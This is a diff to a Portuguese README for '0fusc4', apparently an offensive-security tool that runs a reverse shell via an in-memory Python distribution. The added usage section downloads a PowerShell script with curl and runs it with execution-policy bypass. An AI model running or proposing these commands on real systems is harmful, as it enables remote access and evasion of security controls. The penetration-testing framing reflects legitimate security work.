@@ -9,5 +9,11 @@ Durante a execução do shell reverso, o 0fusc4 aguarda comandos enviados pelo s
 
 Dessa forma, o 0fusc4 possibilita a execução de um shell reverso por meio de um script Python, utilizando uma distribuição Python em memória. Essa ferramenta é útil para atividades de teste de penetração e avaliação de segurança, permitindo o acesso remoto a sistemas para realizar ações específicas, conforme necessário.
 
+Use:
+
+# curl -O "http://example.com/0fusc4.ps1"
+
+# powershell.exe -ExecutionPolicy Bypass -File "0fusc4.ps1"
+
 ![image](https://github.com/carlosalbertotuma/0fusc4/assets/13341724/eff83c3f-3887-45a1-8536-d567aa26d52d)
 
